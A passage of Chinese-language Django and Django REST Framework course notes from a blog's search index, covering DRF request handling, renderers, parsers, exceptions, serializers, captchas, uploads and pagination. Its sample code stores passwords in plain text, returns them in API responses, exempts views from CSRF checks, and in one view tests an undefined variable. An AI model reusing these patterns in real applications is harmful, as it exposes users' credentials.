抽象表的概念","categories":[],"tags":[]},{"title":"","slug":"drf-day2","date":"2024-10-24T11:20:58.351Z","updated":"2024-10-07T05:21:30.734Z","comments":true,"path":"2024/10/24/drf-day2/","permalink":"http://example.com/2024/10/24/drf-day2/","excerpt":"","text":"drf-day21. 知识回顾123456789101. 前后端分离的架构 后端负责数据的提供 前端完成页面的展示以及数据的渲染 二者通过ajax进行交互2. 接口API3. RESTFul架构 遵从了REST规范4. Django类视图 FBV: function base view 函数视图 CBV: class base view 类视图 5. DRF的视图开发 APIView继承了Django的View类 2. Request模块 主要功能: 用来获取请求中所包含的各种参数 入口: request = self.initialize_request(request, *args, **kwargs) Request类12345678910111213141516171819class Request: def __init__(self, request, parsers=None, authenticators=None, negotiator=None, parser_context=None): assert isinstance(request, HttpRequest), ( .format(request.__class__.__module__, request.__class__.__name__) ) # request是django原生的request对象, 赋值给DRF视图类作为一个属性 _request # self就是当前视图类 self._request = request self.parsers = parsers or () self.authenticators = authenticators or () self.negotiator = negotiator or self._default_negotiator() self.parser_context = parser_context self._data = Empty self._files = Empty self._full_data = Empty self._content_type = Empty self._stream = Empty DRF获取参数的方式 GET请求可以通过request.GET以及request.query_params来获取参数 POST请求有多种传递参数的形式,request.data可以获取多种类型的参数 123456789101112131415161718192021class StudentAPIView(APIView): def get(self, request, *args, **kwargs): print(&quot;get Success&quot;) # WSGI request print(request._request.GET.get(&quot;email&quot;)) # 不推荐 # restframework.views.Request print(request.GET.get(&quot;email&quot;)) # 通过DRF扩展的方式来获取参数 print(request.query_params.get(&quot;pwd&quot;)) # DRF扩展的获取参数的方式 return Response(&quot;GET OK&quot;) def post(self, request, *args, **kwargs): print(&quot;post Success&quot;) print(request._request.POST.get(&quot;email&quot;)) print(request.POST.get(&quot;email&quot;)) # 可以获取前端传递各种类型的参数 DRF扩展的 兼容性最强 print(request.data) return Response(&quot;POST OK&quot;) 3. 渲染模块 render 渲染器: 决定了你的数据以何种形式返回到前端 源码流程 源码入口: self.finalize_response(request, response, *args, **kwargs) 找到neg = self.perform_content_negotiation(request, force=True)来返回渲染器 获取当前视图所配置的渲染器: renderers = self.get_renderers() 通过return [renderer() for renderer in self.renderer_classes]找到配置的渲染器 在DRF的setting模块中定义默认的渲染器DEFAULT_RENDERER_CLASSES 使用方式123456789101112131415161718192021# DRF的全局配置REST_FRAMEWORK = &#123; # DRF渲染器默认配置 &#x27;DEFAULT_RENDERER_CLASSES&#x27;: [ # json格式的渲染器 &#x27;rest_framework.renderers.JSONRenderer&#x27;, # 浏览器渲染 &#x27;rest_framework.renderers.BrowsableAPIRenderer&#x27;, # &#x27;rest_framework.renderers.TemplateHTMLRenderer&#x27;, ],&#125;# 局部使用class StudentAPIView(APIView): # 为某个视图单独指定渲染器 局部使用 # 局部配置的优先级高于全局配置 renderer_classes = (BrowsableAPIRenderer,) def get(self, request, *args, **kwargs): print(&quot;get Success&quot;) 4. DRF解析模块 parser 解析模块: 指定当前视图可以接受什么类型的参数 form-data www-url-encode json 源码解析 源码入口: self.initialize_request(request, *args, **kwargs) 获取解析器: parsers=self.get_parsers(), 获取配置的解析器: return [parser() for parser in self.parser_classes] 使用方式12345678910111213141516171819# DRF的全局配置REST_FRAMEWORK = &#123; ...... # DRF默认的解析器的配置 &#x27;DEFAULT_PARSER_CLASSES&#x27;: [ &#x27;rest_framework.parsers.JSONParser&#x27;, # 解析json数据 &#x27;rest_framework.parsers.FormParser&#x27;, # 解析不带文件的form数据 &#x27;rest_framework.parsers.MultiPartParser&#x27; # 解析带文件的form数据 ],&#125;# 局部配置class StudentAPIView(APIView): # 为某个视图单独指定解析器 局部使用 # 局部配置的优先级高于全局配置 parser_classes = [JSONParser] def get(self, request, *args, **kwargs): print(&quot;get Success&quot;) 5. DRF的异常处理 异常模块主要是处理在各个方法执行过程中所发生的问题 异常源码 异常处理源码入口: response = self.handle_exception(exc) 获取处理异常的方法: exception_handler = self.get_exception_handler() 返回处理异常的方法: return self.settings.EXCEPTION_HANDLER 异常处理的逻辑在: rest_framework.views.exception_handler 12345678910111213141516171819202122232425262728293031def handle_exception(self, exc): &quot;&quot;&quot; Handle any exception that occurs, by returning an appropriate response, or re-raising the error. &quot;&quot;&quot; # 判断异常是否属于某个异常实例 if isinstance(exc, (exceptions.NotAuthenticated, exceptions.AuthenticationFailed)): # WWW-Authenticate header for 401 responses, else coerce to 403 auth_header = self.get_authenticate_header(self.request) if auth_header: exc.auth_header = auth_header else: exc.status_code = status.HTTP_403_FORBIDDEN # 获取处理异常的方法 handler exception_handler = self.get_exception_handler() context = self.get_exception_handler_context() # 异常处理的结果 判断exception_handler方法处理的结果是否有值 # 有值: 代表异常已经被DRF处理了 值为None: 代表DRF无法处理此异常 response = exception_handler(exc, context) # 根据上个方法处理的异常信息判断异常是否已经被处理 if response is None: self.raise_uncaught_exception(exc) response.exception = True # 如果response有值 则代表异常已经被处理 返回异常信息 return response 自定义异常的处理 对于DRF无法处理的某些异常,我们可以通过自定义的方式完成处理 123456789101112131415161718from rest_framework.response import Responsefrom rest_framework.views import exception_handler as drf_exception_handlerdef exception_handler(exc, context): error = &quot;%s %s %s&quot; % (context[&quot;view&quot;], context[&quot;request&quot;].method, exc) print(error) # 先让DRF处理异常 根据异常处理的返回值来判断异常是否被处理 response = drf_exception_handler(exc, context) # 如果返回值为None 代表DRF无法处理此异常 需要自定义处理 if response is None: return Response(&#123;&quot;error_message&quot;: &quot;上帝请稍等,程序猿正在加紧处理中~&quot;&#125;) # 如果response不为空 说明异常已经被处理了 return response 12345# 总结1. 异常处理是通过`self.get_exception_handler()`获取异常处理的方法2. 通过`return self.settings.EXCEPTION_HANDLER`获取DRF默认的处理异常的方法3. 自定义异常时可以先让drf处理已知的异常,DRF无法处理的异常由我们自定义处理4. 可以通过`exception_handler`来判断异常是否已经被处理 6. Response模块Response类123456789101112131415161718192021222324252627class Response(SimpleTemplateResponse): def __init__(self, data=None, status=None, template_name=None, headers=None, exception=False, content_type=None): super().__init__(None, status=status) if isinstance(data, Serializer): msg = ( &#x27;You passed a Serializer instance as data, but &#x27; &#x27;probably meant to pass serialized `.data` or &#x27; &#x27;`.error`. representation.&#x27; ) raise AssertionError(msg) self.data = data self.template_name = template_name self.exception = exception self.content_type = content_type &quot;&quot;&quot;data=None, 响应回去的数据status=None, 响应的状态码template_name=None 渲染的模板地址 不处理headers=None, 响应头exception=False, 是否有异常content_type=None 数据格式 &quot;&quot;&quot; 7. DRF 序列化组件[重点] DRF常用的序列化器类: Serializer(偏底层)、ModelSerializer(常用)、ListSerializer(做群体操作) 模型设计123456789101112131415161718192021222324252627# 静态资源目录MEDIA_ROOT = os.path.join(BASE_DIR, &quot;media/&quot;)from django.views.static import servefrom django.conf import settingsre_path(r&#x27;^media/(?P&lt;path&gt;.*)&#x27;, serve, &#123;&quot;document_root&quot;: settings.MEDIA_ROOT&#125;),class Employee(models.Model): gender_choices = ( (0, &quot;male&quot;), (1, &quot;female&quot;), (2, &quot;other&quot;), ) username = models.CharField(max_length=100) password = models.CharField(max_length=64) gender = models.SmallIntegerField(choices=gender_choices, default=0) phone = models.CharField(max_length=11, null=True, blank=True) pic = models.ImageField(upload_to=&quot;pic/&quot;, default=&quot;pic/1.jpg&quot;) class Meta: db_table = &quot;bz_employee&quot; verbose_name = &quot;员工&quot; verbose_name_plural = verbose_name def __str__(self): return self.username Serializer初始 序列化器的定义 12345678class EmployeeSerializer(serializers.Serializer): &quot;&quot;&quot; 定义序列化器类: 需要为每一个model编写对应的序列化器类 &quot;&quot;&quot; username = serializers.CharField() password = serializers.CharField() gender = serializers.IntegerField() pic = serializers.ImageField() 序列化器的使用 1234567891011121314151617181920212223242526272829303132class EmployeeAPIView(APIView): def get(self, request, *args, **kwargs): emp_id = kwargs.get(&quot;id&quot;) if emp_id: # 查询单个 emp_obj = Employee.objects.get(pk=emp_id) # 使用序列化器完成对象的序列化 # .data 将序列化器中的数据打包成字典返回 employee_serializer = EmployeeSerializer(emp_obj).data return Response(&#123; &quot;status&quot;: 200, &quot;message&quot;: &quot;查询单个员工成功&quot;, &quot;results&quot;: employee_serializer &#125;) else: employee_objects_all = Employee.objects.all() # 在序列化多个对象时 需要制定属性many=True emp_data = EmployeeSerializer(employee_objects_all, many=True).data print(emp_data) return Response(&#123; &quot;status&quot;: 200, &quot;message&quot;: &quot;查询所有员工成功&quot;, &quot;results&quot;: emp_data &#125;) 12345# 总结1. 需要为每个模型指定一个单独的序列化器类2. 在为前端返回数据时,需要响应序列化后的 .data的值3. 在序列化器中的字段必须与模型的字段保持一致,否则无法序列化, 如果某个字段不想序列化时,可以不写4. 序列化多个对象时,需要指定many=True 对字段进行自定义123456789101112131415161718192021222324252627282930313233class EmployeeSerializer(serializers.Serializer): &quot;&quot;&quot; 定义序列化器类: 需要为每一个model编写对应的序列化器类 &quot;&quot;&quot; username = serializers.CharField() password = serializers.CharField() # gender = serializers.IntegerField() # pic = serializers.ImageField() # 自定义字段 使用SerializerMethodField来完成自定义 aaa = serializers.SerializerMethodField() # 为自定义字段提供值的方法 # 自定义字段的属性名随意 但是为字段提供值的方法必须是 get_字段名 # self是当前序列化器对象 obj是当前被序列化的对象 def get_aaa(self, obj): return &quot;aaa&quot; # 自定义性别 gender = serializers.SerializerMethodField() def get_gender(self, obj): # gender 值是choices类型 get_字段名_display直接访问值 print(obj.get_gender_display()) return obj.get_gender_display() pic = serializers.SerializerMethodField() def get_pic(self, obj): print(obj.pic) # http://127.0.0.1:8000/media/pic/3.jpg # print(&quot;http://127.0.0.1:8000/&quot; + settings.MEDIA_URL + str(obj.pic)) return &quot;%s%s%s&quot; % (&quot;http://127.0.0.1:8000/&quot;, settings.MEDIA_URL, str(obj.pic)) 1234# 总结 1. 字段类型文档: https://www.django-rest-framework.org/api-guide/fields/ 2. 序列化: 数据从数据库查出,将数据传递给序列化器进行转化成Response可以识别的类型,通过data属性可以获取到序列化后的数据,返回到前端 3. 反序列化: 数据从前端传入到视图,通过序列化器保存到数据库 反序列化 反序列化器定义 123456789101112131415161718192021222324252627class EmployeeDeSerializer(serializers.Serializer): &quot;&quot;&quot; 反序列化: 将前端提交的数据保存到数据库 1. 需要前端提供哪些字段 2. 对字段进行安全校验 3. 有没有字段需要额外的校验 反序列化不需要自定义字段 &quot;&quot;&quot; # 添加校验规则 username = serializers.CharField( max_length=3, min_length=2, error_messages=&#123; &quot;max_length&quot;: &quot;长度太长了&quot;, &quot;min_length&quot;: &quot;长度太短了&quot;, &#125; ) password = serializers.CharField() phone = serializers.CharField() # 如果想要完成对象的新增 必须重写create方法 # self是序列化器对象 validated_data需要保存的数据 def create(self, validated_data): print(self) print(validated_data) return Employee.objects.create(**validated_data) 反序列化视图 12345678910111213141516171819202122232425262728293031323334def post(self, request, *args, **kwargs): # 获取前端传递的参数 request_data = request.data # 前端传递的数据进行入库时 需要判断数据的格式是否合法 if not isinstance(request_data, dict) or request_data == &#123;&#125;: return Response(&#123; &quot;status&quot;: 400, &quot;message&quot;: &quot;参数有误&quot;, &#125;) # 使用序列化器完成数据库的反序列化 # 在数据进行反序列化的时候需要指定关键字 data serializer = EmployeeDeSerializer(data=request_data) # 需要对反序列化的数据进行校验 通过is_valid() 方法来对传递过来的参数进行校验 校验合法时才会返回True if serializer.is_valid(): # 调用save()方法进行数据的保存 必须重写create()方法 emp_ser = serializer.save() print(emp_ser) return Response(&#123; &quot;status&quot;: 200, &quot;message&quot;: &quot;员工添加成功&quot;, &quot;results&quot;: EmployeeSerializer(emp_ser).data &#125;) else: return Response(&#123; &quot;status&quot;: 400, &quot;message&quot;: &quot;员工添加失败&quot;, # 保存失败的信息会包含在 .errors中 &quot;results&quot;: serializer.errors &#125;) 反序列化时从前端获取的参数必须以关键字的形式EmployeeDeSerializer(data=request_data)传递到序列化器类 通过序列化类的is_valid对传递到序列化器的数据进行校验. 在此时才会调用序列化器为每个字段定义好的反序列化规则. 如果用过校验返回True, 失败返回False 保存失败的错误信息会包含在serializer.errors中 通过serializer.save()保存对象时需要重写create()方法 作业123451. 掌握各个模块的作用以及使用方式 掌握源码流程 request render parser 异常处理 Response2. 掌握DRF序列化器的使用 [重点重点] 使用序列化器完成 教师表的 查询单个 查询所有 新增单个 删除(可选)","categories":[],"tags":[]},{"title":"","slug":"drf-day1","date":"2024-10-24T11:20:58.350Z","updated":"2024-10-07T05:21:30.860Z","comments":true,"path":"2024/10/24/drf-day1/","permalink":"http://example.com/2024/10/24/drf-day1/","excerpt":"","text":"drf-day11. 前置知识前后端分离 后端为前端返回对应的数据,不再处理数据的渲染,不再控制前端样式的改变 无论前端是app还是web网站,对于后端来说没有区别 前后端分离模式下,不再有render|redirect, 对外一律提供API数据(json|xml) 前后端两个独立的项目全部通过ajax请求进行交互 接口API API是一些预先定义的函数，或指软件系统不同组成部分衔接的约定 用来提供应用程序与开发人员基于某软件或硬件得以访问一组数据的能力，而又无需访问源码，或理解内部工作机制的细节。 接口在web开发中指的是由url地址、请求参数、响应数据所构成 接口是web开发中前后端工程师进行数据交互的媒介 RESTFul架构 在长期的前后端分离的开发模式下,为了提高开发效率,大家都默认遵从了一种REST规范,它提供了一套良好的定义接口的格式 121. RESTFul架构是一种软件架构风格、设计风格，而不是标准，只是提供了一组设计原则与约束条件。不是必须遵从的，但有了它以后可以更好的开发出简洁、逻辑清晰的接口2. 只要遵从了REST规范设计的软件就是RESTFul架构 REST规范 核心目的: 设计出更优雅的url API与用户通信的协议尽量使用HTTPS 每一个url用来标识一个唯一的资源 12传统url: https://127.0.0.1:8000/user/get_user/?id=3 获取用户id为3的用户信息rest url: https://127.0.0.:8000/user/get_user/1/ 代表用户id为1的用户 请求方法 123451. GET: 从服务器获取资源 查询2. POST: 在服务器新增资源 添加3. DELETE: 从服务器删除资源 删除4. PUT: 更新服务器资源 修改5. PATCH: 更新部分资源 局部修改 状态码 123# 每一个http请求都会返回对应的信息, 而RESTFul要求在返回数据时提供本次请求的状态码# 返回的数据格式有一定的要求# 包含请求信息 接口API的本质 12345# RESTFul是为了设计一个良好的接口,而大家都遵从默认的规范会节省大量的事件1. 后端接收一个包含参数的url2. 解析参数,并对请求做相应的处理3. 将处理后的结果序列化成json4. 按照一定的格式返回前端 2. 工具使用postman使用 csrf装饰器12345678from django.utils.decorators import method_decoratorfrom django.views.decorators.csrf import csrf_exempt, csrf_protect@csrf_protect # 为某个函数视图单独添加csrf认证@csrf_exempt # 为某个函数视图免除csrf认证@method_decorator(csrf_exempt, name=&quot;dispatch&quot;) # 为类视图免除csrf认证@method_decorator(csrf_protect, name=&quot;dispatch&quot;) # 为类视图添加csrf认证 Django的admin站点12345# python manage.py createsuperuser# 输入用户名# 输入邮箱 邮箱格式必须正确# 输入两次密码 必须一致浏览器输入url访问后台站点 3. Django开发API接口接口开发 url 1234567urlpatterns = [ path(&quot;users/&quot;, views.user), # 类视图的url定义 path(&quot;user_view/&quot;, views.UserView.as_view()), path(&quot;user_view/&lt;str:id&gt;/&quot;, views.UserView.as_view()),] views 可以根据前端发送的不同的http请求来匹配到Django类视图中定义的不同的函数 url路由中的参数可以使用kwargs.get(“参数名”)的形式接受 接口在返回数据的时候需要指定数据的格式以及状态码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960@method_decorator(csrf_exempt, name=&quot;dispatch&quot;) # 为类视图免除csrf认证class UserView(View): def get(self, request, *args, **kwargs): &quot;&quot;&quot; 提供查询单个用户以及 多个用户的接口 :param request: 请求对象 :param args: :param kwargs: :return: 返回查询结果 &quot;&quot;&quot; user_id = kwargs.get(&quot;id&quot;) if user_id: user_val = User.objects.filter(pk=user_id).values(&quot;username&quot;, &quot;password&quot;, &quot;gender&quot;).first() print(user) if user: # 如果查询出用户的信息, 则返回到前端 return JsonResponse(&#123; &quot;status&quot;: 200, &quot;message&quot;: &quot;查询单个用户成功&quot;, &quot;results&quot;: user_val &#125;) else: # 用户id不存在 则代表查询所有用户信息 user_objects_all = User.objects.all().values(&quot;username&quot;, &quot;password&quot;, &quot;gender&quot;) if user_objects_all: return JsonResponse(&#123; &quot;status&quot;: 200, &quot;message:&quot;: &quot;查询所有用户成功&quot;, &quot;results&quot;: list(user_objects_all) &#125;) return JsonResponse(&#123; &quot;status&quot;: 400, &quot;message&quot;: &quot;查询用户失败&quot;, &#125;) def post(self, request, *args, **kwargs): &quot;&quot;&quot; 新增单个用户 &quot;&quot;&quot; username = request.POST.get(&quot;username&quot;) pwd = request.POST.get(&quot;password&quot;) try: user_obj = User.objects.create(username=username, password=pwd) return JsonResponse(&#123; &quot;status&quot;: 200, &quot;message&quot;: &quot;新增单个用户成功&quot;, &quot;results&quot;: &#123;&quot;username&quot;: user_obj.username, &quot;gender&quot;: user_obj.gender&#125; &#125;) except: return JsonResponse(&#123; &quot;status&quot;: 400, &quot;message&quot;: &quot;新增失败&quot;, &#125;) Django类视图源码 4. DRF初识 DRF全称DjangoRestFrameWork, 是一个灵活强大工具包,主要用来构建RESTFUl风格的web API, 它是django生态中默认的前后端分离的开发标准 官网: https://www.django-rest-framework.org/ GitHhub地址: https://github.com/encode/django-rest-framework/tree/master DRF 的搭建1234567891011# DRF 需要以下版本的支持 Python（3.5、3.6、3.7、3.8、3.9） Django（2.0、2.2、3.0、3.1）# 安装DRF pip install djangorestframework==3.10.0 # 配置DRFINSTALLED_APPS = [ ... &#x27;rest_framework&#x27;,] DRF的第一个案例1 DRF请求的声明周期 DRF同样是在url中的as_view作为入口, 执行的是APIView中的as_view 在APIView类中的as_view方法中调用了父类(django)的as_view方法, APIView返回了一个禁用了csrf的视图 在父类的as_view方法中调用了self.dispatch()方法进行了请求的分发。由于子类自己实现了dispatch方法,所以此时调用的是子类自己的dispatch()方法 DRF的dispatch方法进行了额外的功能的实现 完成处理后再将情笔趣交给类视图进行逻辑,得到响应的结果后返回到前台. 12345678910111213141516171819202122232425262728293031323334# DRF的核心方法def dispatch(self, request, *args, **kwargs): &quot;&quot;&quot; `.dispatch()` is pretty much the same as Django&#x27;s regular dispatch, but with extra hooks for startup, finalize, and exception handling. &quot;&quot;&quot; # 将参数赋值给实例化对象 StudentAPIView self.args = args self.kwargs = kwargs # DRF的请求模块 处理drf请求相关 request = self.initialize_request(request, *args, **kwargs) self.request = request self.headers = self.default_response_headers # deprecate? try: # 三大认证模块 self.initial(request, *args, **kwargs) # Get the appropriate handler method if request.method.lower() in self.http_method_names: handler = getattr(self, request.method.lower(), self.http_method_not_allowed) else: handler = self.http_method_not_allowed response = handler(request, *args, **kwargs) except Exception as exc: #异常的捕获 一旦发生异常将在此处理 response = self.handle_exception(exc) # 响应模块 self.response = self.finalize_response(request, response, *args, **kwargs) return self.response 作业123451. 掌握django类视图开发接口 查询单个 查询所有 新增单个 删除单个 (选做)2. 掌握django类视图的请求流程3. 掌握DRF视图的请求流程","categories":[],"tags":[]},{"title":"","slug":"Django-Day07","date":"2024-10-24T11:20:58.348Z","updated":"2024-10-07T05:20:53.466Z","comments":true,"path":"2024/10/24/Django-Day07/","permalink":"http://example.com/2024/10/24/Django-Day07/","excerpt":"","text":"Django扩展一、验证码1、简介在常规的Form表单使用中，验证码是常用的组件，用于更好的保障请求的合法性，防止无效访问，恶意访问，暴力破解等攻击 在服务器端，生成一个随机的code：“aecd1” ，将code画到一张图片中，最终将图片写出给client。 注意：依赖第三方包：pillow pip install pillow 2、验证码使用过程2.1 导入第三方库将文件拷贝到自己的项目app中，2个py文件，1个data文件夹，保证三个处于项目中的统一个目录中。 2.2 生成验证码12345678910111213141516import random,stringfrom captcha.image import ImageCaptcha #从image.py中导入ImageCaptchar类def getcaptcha(request): # 127.0.0.1:8000/getcaptcha #为验证码设置字体 获取当前目录下的xxx目录下的segoesc.ttf文件 image = ImageCaptcha(fonts=[os.path.abspath(&quot;xxx/segoesc.ttf&quot;)]) #随机码 #大小写英文字母+数字，随机抽取5位作为验证码 [&#x27;x&#x27;,&#x27;x&#x27;,&#x27;x&#x27;,&#x27;x&#x27;,&#x27;x&#x27;] -&gt; &quot;ABCDE&quot; code = random.sample(string.ascii_lowercase+string.ascii_uppercase+string.digits,5) #将验证码存入session，以备后续验证 random_code = &quot;&quot;.join(code) request.session[&#x27;code&#x27;]=random_code #将生成的随机字符拼接成字符串，作为验证码图片中的文本 data = image.generate(random_code ) #写出验证图片 给客户端 return HttpResponse(data,&quot;image/png&quot;) 2.3 在html中使用验证码1234567891011&lt;input type=&quot;text&quot; name=&quot;identifycode&quot;&gt;&lt;img src=&quot;&#123;% url &#x27;identify_demo:getcaptcha&#x27; %&#125;&quot; id=&quot;image_code&quot; width=&quot;80px&quot; height=&quot;30px&quot; align=&quot;center&quot;&gt; &lt;a href=&quot;javascript:void(0)&quot; onclick=&quot;change()&quot;&gt;换一张&lt;/a&gt;&lt;script&gt; function change() &#123; var url = &quot;&#123;% url &#x27;identify_demo:getcaptcha&#x27; %&#125;?&quot;+new Date().getTime() $(&#x27;#image_code&#x27;).attr(&#x27;src&#x27;,url) //刷新验证码 &#125;&lt;/script&gt; 2.4 验证是否正确123456def registlogic(request): code = request.session.get(&#x27;code&#x27;) if code.lower() == request.POST.get(&#x27;identifycode&#x27;).lower(): return HttpResponse(&quot;成功&quot;) else: return HttpResponse(&quot;失败&quot;) 二、文件上传1、简介Django的模型类（django.db.models.Model）提供了两个字段FileField和ImageField用于上传文件和图片。而ImageField继承之FileField，class ImageField(FileField): 使用Django的ImageField需要提前安装pillow模块，pip install pillow即可。 2、使用步骤使用FileField或者ImageField字段的步骤： 在settings文件中，配置MEDIA_ROOT，作为你上传文件在服务器中的基本路径。 添加FileField或者ImageField字段到模型中，定义好upload_to参数，文件最终会放在MEDIA_ROOT目录的“upload_to”子目录中。 所有真正被保存在数据库中的，只是指向你上传文件路径的字符串而已。可以通过url属性，在Django的模板中方便的访问这些文件。例如，假设有一个ImageField字段，名叫mug_shot，那么在Django模板的HTML文件中，可以使用来获取该文件。 可以通过name和size属性，获取文件的名称和大小信息。 3、实例：为用户上传头像3.1 设置文件保存目录123# settings.py中：MEDIA_ROOT = os.path.join(BASE_DIR,&quot;media&quot;) # 项目目录下的media目录 需要在项目目录下创建media目录 3.2 定义Model1234class User(models.Model): name = models.CharField(max_length=20) #文件将存于 MEDIA_ROOT目录下的pics目录下 pic = models.ImageField(upload_to=&quot;pics&quot;) 注意：定义好Model，记得生成移植文件并执行 3.3 定义form表单123456&lt;form action=&quot;&#123;% url &#x27;uploadfile_demo:uplogic&#x27; %&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; 用户名：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt; 头像：&lt;input type=&quot;file&quot; name=&quot;source&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 3.4 定义view函数12345678910def uplogic(request): try: name = request.POST.get(&#x27;name&#x27;) file = request.FILES.get(&#x27;source&#x27;) file.name = generateUUID(file.name) # 调用自定义的generateUUID生成唯一文件名 user = User.objects.create(name=name, pic=file) return HttpResponse(&quot;上传成功&quot;) except: return HttpResponse(&quot;上传失败&quot;) 12345import uuid,osdef generateUUID(filename): # 创建唯一的文件名 id = str(uuid.uuid4()) extend = os.path.splitext(filename)[1] return id+extend 注意，此时数据库中存储的路径是相对于MEDIA_ROOT的路径 所以可以将MEDIA_ROOT设置为静态资源根目录，可便于后续的头像回显 3.5 回显图片 设置静态资源根目录 1234MEDIA_ROOT = os.path.join(BASE_DIR,&#x27;media&#x27;)STATIC_URL = &#x27;/static/&#x27;STATICFILES_DIRS = [ os.path.join(BASE_DIR, &#x27;static&#x27;), MEDIA_ROOT ] view函数 123def query(request): users = User.objects.all() return render(request,&#x27;uploadfile_demo/detail.html&#x27;,&#123;&#x27;users&#x27;:users&#125;) 模板中使用 123&#123;% load static %&#125;&lt;img src=&quot;&#123;% static user.headpic.url %&#125;&quot; width=&quot;50px&quot;&gt; 补充：Python原生文件操作 1234567891011def test_upload2(r): import os,uuid b = r.FILES.get(&quot;source&quot;) # 获取上传的文件 unique_name = str(uuid.uuid4()) # 唯一文件名 ext = os.path.splitext(b.name)[1] # 文件后缀 name = unique_name + ext # 拼接文件名 with open(file=os.path.join(os.path.abspath(&quot;media/just_test/&quot;),name),mode=&quot;wb&quot;) as output: for chunk in b.chunks(): #如果超过2.5M则分块，分为64Kb的块依次读取 #chunks是django.core.files.base.File中的方法 output.write(chunk) return HttpResponse(&quot;ok&quot;) 三、分页显示1、简介 Django自身提供了一些类来实现管理分页，数据被分在不同的页面中，并带有“上一页&#x2F;下一页”标签。这个类叫做Pagination，其定义位于 django&#x2F;core&#x2F;paginator.py 中。 2、Paginator分页器2.1 初始化方法pagtor = Paginator(User.objects.all(),per_page=3) # 构造分页器对象 12345678910# 源码class Paginator(object): def __init__(self, object_list, per_page, orphans=0, allow_empty_first_page=True): self.object_list = object_list self.per_page = int(per_page) self.orphans = int(orphans) self.allow_empty_first_page = allow_empty_first_page self._num_pages = self._count = None 2.2 属性 Paginator.count：所有页面对象总数，即统计object_list中item数目。 Pagnator.num_pages：页面总数。 pagiator.page_range：页面范围，从1开始，例如[1,2,3,4]。 1234pagtor = Paginator(User.objects.all(),per_page=3) # 构造分页器对象print(pagtor.count) # 获取item总数print(pagtor.num_pages) # 页面数print(pagtor.page_range) # 页面范围 2.3 page方法（重点）Paginator.page(number)：根据参数number返回一个Page对象，表示第number页。 1page = Paginator(User.objects.all(),per_page=3).page(1) # 获取第一页 3、Page对象123456class Page(collections.Sequence): def __init__(self, object_list, number, paginator): self.object_list = object_list self.number = number self.paginator = paginator # 分页器对象 3.1 方法 Page.has_next() 如果有下一页，则返回True。 Page.has_previous() 如果有上一页，返回 True。 Page.has_other_pages() 如果有上一页或下一页，返回True。 Page.next_page_number() 返回下一页的页码。如果下一页不存在，抛出InvlidPage异常。 Page.previous_page_number() 返回上一页的页码。如果上一页不存在，抛出InvalidPage异常。 Page.start_index() 返回当前页上的第一个对象，相对于分页列表的所有对象的序号，从1开始。比如，将五个对象的列表分为每页两个对象，第二页的start_index()会返回3。 Page.end_index() 返回当前页上的最后一个对象，相对于分页列表的所有对象的序号，从1开始。 比如，将五个对象的列表分为每页两个对象，第二页的end_index() 会返回 4。 3.2 属性 Page.object_list 当前页上所有对象的列表。 Page.number 当前页的序号，从1开始。 Page.paginator 相关的Paginator对象。 4、实例4.1 简单分页123456# http://localhost:8000/page/index/?num=2def index(request): number = request.GET.get(&#x27;num&#x27;) pagtor = Paginator(User.objects.all(),per_page=4) page = pagtor.page(number) # 某一页的page对象 return render(request,&#x27;page_demo/index.html&#x27;,&#123;&#x27;page&#x27;:page&#125;) 12345&#123;# 显示某一页所有数据#&#125;&#123;% for user in page.object_list %&#125; &#123;&#123; user.id &#125;&#125; -- &#123;&#123; user.name &#125;&#125; -- &#123;&#123; user.password &#125;&#125; &lt;br&gt;&#123;% endfor %&#125; 4.2 输出序号12345678910&#123;# 显示某一页所有数据#&#125;&#123;% for user in page.object_list %&#125; &#123;&#123; user.id &#125;&#125; -- &#123;&#123; user.name &#125;&#125; -- &#123;&#123; user.password &#125;&#125; &lt;br&gt;&#123;% endfor %&#125;&#123;# 输出所有页号 #&#125;&#123;% for page_num in page.paginator.page_range %&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; page_num &#125;&#125;&quot;&gt;&#123;&#123; page_num &#125;&#125;&lt;/a&gt;&#123;% endfor %&#125; 4.3 显示上一页&#x2F;下一页123456789101112131415&#123;% for user in page.object_list %&#125; &#123;&#123; user.id &#125;&#125; -- &#123;&#123; user.name &#125;&#125; -- &#123;&#123; user.password &#125;&#125; &lt;br&gt;&#123;% endfor %&#125;&#123;% if page.has_previous %&#125; &#123;# 是否有上一页 #&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt;上一页&lt;/a&gt;&#123;% endif %&#125;&#123;% for num in page.paginator.page_range %&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; num &#125;&#125;&quot;&gt;&#123;&#123; num &#125;&#125;&lt;/a&gt;&#123;% endfor %&#125;&#123;% if page.has_next %&#125; &#123;# 是否有下一页 #&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt;下一页&lt;/a&gt;&#123;% endif %&#125; 4.4 页码样式1234567891011121314151617181920212223&lt;style&gt; .a&#123; width:20px; height: 20px; border:1px solid #e1e2e3; cursor:pointer; display: inline-block; text-align: center; line-height: 20px; &#125; .b&#123; border:0; width:20px; height: 20px; cursor:pointer; display: inline-block; text-align: center; line-height: 20px; &#125; a&#123; text-decoration:none; &#125;&lt;/style&gt; 123456789101112131415161718192021222324#显示某一页面数据&#123;% for user in page.object_list %&#125; &#123;&#123; user.id &#125;&#125; -- &#123;&#123; user.name &#125;&#125; -- &#123;&#123; user.password &#125;&#125; &lt;br&gt;&#123;% endfor %&#125;#显示上一页&#123;% if page.has_previous %&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt;上一页&lt;/a&gt;&#123;% endif %&#125;&#123;% for num in page.paginator.page_range %&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; num &#125;&#125;&quot;&gt; &#123;% if num == page.number %&#125; &#123;# 当前选中页的样式 #&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; num &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; num &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt;&#123;% endfor %&#125; #显示下一页&#123;% if page.has_next %&#125; &lt;a href=&quot;/page/index/?num=&#123;&#123; 